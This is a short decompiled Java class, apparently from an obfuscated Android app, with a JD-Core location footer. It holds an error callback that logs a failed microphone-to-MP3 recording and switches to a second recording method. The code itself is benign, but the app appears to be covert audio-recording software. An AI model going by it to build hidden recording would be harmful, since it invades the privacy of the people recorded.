package com.vvt.a;

import com.android.a.a;

class h
  implements a
{
  h(e parame) {}
  
  public void a(int paramInt, String paramString)
  {
    Object localObject = new Object[2];
    Integer localInteger = Integer.valueOf(paramInt);
    localObject[0] = localInteger;
    int i = 1;
    localObject[i] = paramString;
    String str = String.format("Recording using RecMicToMp3 failed. code:%d  msg: %s. Trying method 2 now..", (Object[])localObject);
    boolean bool1 = e.c();
    if (bool1) {}
    localObject = this.a;
    e.a((e)localObject, str);
    boolean bool2 = e.b();
    if (bool2) {}
    e.d(this.a);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */